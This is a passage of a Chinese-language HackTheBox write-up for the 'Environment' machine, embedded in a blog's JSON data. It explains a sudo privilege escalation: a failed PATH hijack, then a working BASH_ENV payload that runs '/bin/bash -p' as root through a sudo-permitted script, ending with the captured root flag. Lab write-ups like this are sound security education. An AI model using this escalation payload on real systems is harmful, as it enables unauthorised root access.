p+=\u003cspan class=\"hljs-string\"\u003e\"ENV BASH_ENV\"\u003c/span\u003e, use_pty\n\nUser hish may run the following commands on environment:\n    (ALL) /usr/bin/systeminfo\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e路径劫持\u003c/h3\u003e\n\u003cp\u003e执行后会运行一些命令，例如 \u003ccode\u003enetstat\u003c/code\u003e 等\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Environment/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ehish@environment:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /usr/bin/systeminfo \n\u003cspan class=\"hljs-comment\"\u003e#!/bin/bash\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\\n### Displaying kernel ring buffer logs (dmesg) ###\"\u003c/span\u003e\ndmesg | \u003cspan class=\"hljs-built_in\"\u003etail\u003c/span\u003e -n 10\n\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\\n### Checking system-wide open ports ###\"\u003c/span\u003e\nss -antlp\n\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\\n### Displaying information about all mounted filesystems ###\"\u003c/span\u003e\nmount | column -t\n\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\\n### Checking system resource limits ###\"\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eulimit\u003c/span\u003e -a\n\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\\n### Displaying loaded kernel modules ###\"\u003c/span\u003e\nlsmod | \u003cspan class=\"hljs-built_in\"\u003ehead\u003c/span\u003e -n 10\n\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\\n### Checking disk usage for all filesystems ###\"\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003edf\u003c/span\u003e -h\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后尝试了一下简单的路径劫持\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ehish@environment:~$ \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e PATH=/home/hish:\u003cspan class=\"hljs-variable\"\u003e$PATH\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现不能成功，因为名字相同的 \u003ccode\u003eshell‑builtin\u003c/code\u003e 总是先被调用\u003c/p\u003e\n\u003cp\u003e但是可以注意到\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Environment/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003esudo\u003c/code\u003e 默认会清掉大部分环境变量，只有在这里明确 \u003ccode\u003eenv_keep\u003c/code\u003e 才会保留；\u003c/p\u003e\n\u003cp\u003e然后 \u003ccode\u003eENV BASH_ENV\u003c/code\u003e 是变量，我们可以控制，\u003ccode\u003ePayload\u003c/code\u003e是：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'/bin/bash -p'\u003c/span\u003e \u003e /tmp/root.sh ; \u003cspan class=\"hljs-built_in\"\u003echmod\u003c/span\u003e +x /tmp/root.sh ; \u003cspan class=\"hljs-built_in\"\u003eenv\u003c/span\u003e -i BASH_ENV=/tmp/root.sh PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/bin/systeminfo\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里做了什么？\u003c/p\u003e\n\u003cp\u003e首先创建 \u003ccode\u003eroot.sh\u003c/code\u003e 执行后会创建一个新的 \u003ccode\u003eshell\u003c/code\u003e 。\u003ccode\u003eenv -i\u003c/code\u003e从一个\u003cstrong\u003e空环境\u003c/strong\u003e开始（清除掉所有原有环境变量），保证后面只存在我们显式指定的变量。\u003ccode\u003eBASH_ENV=/tmp/root.sh\u003c/code\u003e 这是非交互式 Bash 启动时会自动读取并执行的环境变量。我们把它指向刚刚写好的 \u003ccode\u003e/tmp/root.sh\u003c/code\u003e 。\u003ccode\u003ePATH=…\u003c/code\u003e\n设置一个最小可用的 PATH，保证后续 \u003ccode\u003esudo\u003c/code\u003e、\u003ccode\u003ebash\u003c/code\u003e、\u003ccode\u003eecho\u003c/code\u003e 等都能找到。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003esudo /usr/bin/systeminfo\u003c/code\u003e 以 root 身份执行 \u003ccode\u003esysteminfo\u003c/code\u003e 脚本。因为 \u003ccode\u003esysteminfo\u003c/code\u003e 文件头是 \u003ccode\u003e#!/bin/bash\u003c/code\u003e，所以它会被非交互式的 Bash 解释执行。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Environment/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@environment:~# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt \n74c70b0fe4bcb9d5a6aff48c71046584\n\u003c/code\u003e\u003c/pre\u003e","title":"HackTheBox - Machine - Environment","date":"2025-05-06","updated":"2025-05-06","comments":true,"tags":["Linux靶机","HackTheBox","ENV","Laravel","路径劫持","encrypt"],"categories":"靶机","description":"Machine Environment https://app.hackthebox.com/machines/Environment | Linux | Medium 前期踩点 Web 渗透 信息收集 访问 HTTP 服务 可能是开发环境？ 扫描一下目录 /upload ，直接访问能得到 PHP...","isEncrypted":true},"recentPosts":[{"id":"群U靶机SudoHome_sunset","title":"群U靶机 - SudoHome","date":"2025-11-23","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"群U靶机Yibasuo","title":"群U靶机 - Yibasuo","date":"2025-11-22","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"HackMyVMHunter","title":"HackMyVM - Hunter","date":"2025-11-21","isEncrypted":false,"year":"2025","month":"11","day":"21"},{"id":"HackTheBoxSeason9 - NanoCorp","title":"HackTheBox - Season9 - NanoCorp","date":"2025-11-14","isEncrypted":true,"year":"2025","month":"11","day":"14"},{"id":"HackTheBoxSeason8 - Voleur","title":"HackTheBox - Machine - Voleur","date":"2025-07-07","isEncrypted":false,"year":"2025","month":"11","day":"12"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Machine - RustyKey","date":"2025-06-30","isEncrypted":false,"year":"2025","month":"11","day":"12"},{"id":"HackMyVMKrustykrab","title":
